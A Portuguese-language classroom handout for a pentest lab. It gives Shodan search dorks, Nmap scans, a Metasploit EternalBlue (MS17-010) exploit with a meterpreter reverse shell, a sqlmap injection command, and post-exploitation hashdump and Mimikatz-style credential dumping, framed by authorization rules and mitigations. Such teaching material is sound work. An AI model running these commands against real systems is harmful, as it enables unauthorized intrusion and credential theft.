# Handout (msf) + shodan (web)

**Objetivo:** mostrar, em ambiente controlado, o fluxo prático de um teste de intrusão: descoberta - reconhecimento - exploração - pós-exploração - limpeza.  
**Ambiente obrigatório:** laboratório isolado (VMs em VirtualBox/VMware, rede interna/host-only). Nunca execute testes em sistemas sem autorização expressa.

---

## 1. Regras de conduta e autorização

1. Todo teste só pode ser realizado em ativos para os quais exista autorização por escrito (professor/instituição).
2. Registre todas as ações: comandos executados, resultados, screenshots e horário.  
3. Não execute qualquer teste em redes públicas, sistemas de terceiros ou recursos do ambiente institucional sem permissão explícita.  
4. Ao término, restaure snapshots das VMs para garantir integridade do laboratório.

---

## 2. Pré-requisitos (o que cada aluno deve ter)

- Kali Linux (Metasploit disponível: `msfconsole`).
- VM alvo: Windows 7 SP1 sem patch (apenas em laboratório isolado) - exemplo de IP: `192.168.0.1`.  
- Navegador com acesso ao site `https://shodan.io` (apenas para demonstração via web).  
- Ferramentas instaladas: `nmap`, `sqlmap`.  
- Rede isolada entre máquinas (Host-only / Internal network).  

---

## 3. Verificação inicial do ambiente

Abra um terminal em Kali e execute:

```bash
# Instalar ferramentas essenciais (se necessário)
sudo apt update && sudo apt install nmap sqlmap -y

# Iniciar Metasploit
msfconsole

# Verificar conectividade com o alvo
ping 192.168.0.1
```

Se `ping` não responder:

* Verifique a configuração de rede da VM (host-only / internal).
* Assegure que ambos (Kali e Windows VM) estejam na mesma sub-rede.

---

## 4. Descoberta — uso do Shodan (web)

**Objetivo:** mostrar como Shodan revela banners e serviços; no lab, usaremos esse raciocínio com a VM alvo.
Abra `https://shodan.io` no navegador e use a barra de pesquisa. Exemplos de *dorks* para demonstração (use apenas na interface web do Shodan):

* Buscar Windows com SMB aberto:

```bash
os:Windows port:445 country:"US"
```

* Buscar RDP exposto:

```bash
port:3389 os:Windows
```

* Buscar servidores web Apache:

```bash
port:80 apache country:"BR"
```

* Buscar MSSQL exposto:

```bash
port:1433 os:Windows
```

**O que observar na saída do Shodan:**

* Banners que mostram versão do software (ex.: `Microsoft-IIS/7.5`, `Apache/2.2`).
* Portas abertas e serviços.
* Esses dados ajudam a identificar potenciais vetores de ataque — no entanto, só se usa em sistemas com autorização.

**Observação para a sala:** no laboratório, o `IP` do target (`192.168.0.1`) será tratado como um alvo “Shodan-like” para fins didáticos.

---

## 5. Reconhecimento com Nmap

**Objetivo:** confirmar serviços e versões no alvo para escolher exploits apropriados.

1. Escaneamento básico e de versão:

```bash
sudo nmap -sV -sC -O 192.168.0.1
```

2. Salvar saída em XML (para importar ao Metasploit se desejar):

```bash
sudo nmap -sV -sC -O -oX /tmp/nmap_results.xml 192.168.0.1
```

**Interpretação da saída:**

* Procure por portas relevantes: `445` (SMB), `3389` (RDP), `80` (HTTP), `1433` (MSSQL).
* Verifique as versões apresentadas pelo `-sV` (serão usadas para mapear CVEs/exploits compatíveis).

---

## 6. Importar resultados para Metasploit (opcional)

Se quiser centralizar resultados no banco de dados do Metasploit:

Dentro do `msfconsole`:

```bash
db_import /tmp/nmap_results.xml
hosts
services
```

`hosts` e `services` exibem o que foi importado e facilitam a escolha de módulos.

---

## 7. Exploração com Metasploit — EternalBlue (MS17-010) — passo a passo

**Contexto:** este exemplo usa EternalBlue (MS17-010) em Windows 7 vulnerável dentro do lab.

No `msfconsole`:

1. Procurar e carregar o exploit:

```bash
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
```

2. Verificar opções do módulo:

```bash
show options
```

3. Configurar parâmetros:

```bash
set RHOSTS 192.168.0.1
set LHOST 192.168.56.100          # IP da sua máquina Kali
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

4. Confirmar vulnerabilidade antes de explorar:

```bash
check
# se retornar "The target is VULNERABLE", prosseguir
```

5. Executar o exploit:

```bash
exploit
```

6. Após sucesso — listar e entrar na sessão:

```bash
sessions -l
sessions -i 1
sysinfo
shell
```

**Observações:**

* Se o exploit falhar, verifique firewall, versão/arquitetura do Windows e conectividade.
* Explique aos alunos o propósito de `check` — evita executar explorações desnecessárias.

---

## 8. Exploração de serviços web (exemplo)

Se a VM possuir um servidor web (Apache) vulnerável, procure módulos adequados:

No `msfconsole`:

```bash
search apache type:exploit
use exploit/multi/http/<modulo_encontrado>
set RHOSTS 192.168.0.1
set LHOST 192.168.56.100
exploit
```

Para vulnerabilidades de injeção em aplicações web, use `sqlmap` (fora do Metasploit), com um exemplo básico:

```bash
sqlmap -u "http://192.168.0.1/vulnerable.php?id=1" --dbms=mssql --dbs
```

---

## 9. Pós-exploração: atividades e comandos úteis

**Objetivo:** demonstrar coleta de informações e técnicas de pivot, sempre no laboratório.

No Meterpreter (após abrir sessão):

```bash
getuid            # ver usuário atual
sysinfo           # info do sistema remoto
hashdump          # extrai hashes (requer privilégios)
upload /path/tool.exe # enviar ferramenta para o host remoto (uso controlado)
```

**Pivot / port forwarding:**

```bash
portfwd add -l 8080 -p 80 -r 192.168.0.1
# Em Kali: acessar http://localhost:8080 para ver o serviço remoto via túnel
```

**Dump de credenciais (exemplo didático):**

* Em laboratório, usar módulos pós-exploração como `load kiwi` (equivalente a Mimikatz dentro do Meterpreter) para demonstrar como credenciais podem ser coletadas — sempre enfatizando impacto e contramedidas.

---

## 10. Boas práticas de documentação em aula

1. Cada grupo registra: comandos, saídas, screenshots e interpretações.
2. Uma pessoa documenta enquanto a outra executa.
3. Relatório final com: resumo do fluxo, evidências coletadas e recomendações de mitigação.

---

## 11. Cleanup (retornar ambiente ao estado inicial)

No `msfconsole`:

```bash
sessions -K       # termina todas as sessões
workspace -d <nome_do_workspace>   # remover workspace se usado
```

Em seguida:

* Desligar VMs.
* Restaurar snapshots do laboratório para o estado limpo.
* Confirmar que não restou ferramenta/executável carregado nas VMs.

---

## 12. Mitigações e recomendações de segurança (o que ensinar aos responsáveis pelo sistema)

* Aplicar patches de segurança (ex.: corrigir MS17-010).
* Desabilitar protocolos inseguros (ex.: SMBv1).
* Manter firewall com regras restritivas (bloquear portas expostas).
* Monitoramento e logs ativos (SIEM / alertas para tentativas anômalas).
* Políticas de senha e autenticação multifator.

---

## 13. Recursos adicionais (sugestões de leitura e prática)

* Documentação Rapid7 (Metasploit).
* Guias e tutoriais do Shodan (uso responsável).
* TryHackMe / HackTheBox — laboratórios controlados para prática.
* Bases de CVE / NVD para correlacionar versões a vulnerabilidades conhecidas.

---

## 14. Modelo de checklist de autorização para testes (uso do professor)

* Nome do responsável pelo sistema: ________________________
* Identificação dos ativos autorizados (IPs/VMs): _______________
* Escopo permitido (ex.: somente VMs X, Y; proibir acesso a redes externas): _______________
* Período do teste: _______________
* Assinatura do responsável: _______________

---

### Atenção

Siga sempre as regras de ética e legislação aplicável. O objetivo deste handout é ensinar procedimentos defensivos e ofensivos em ambiente controlado, com ênfase em mitigação e responsabilidade.
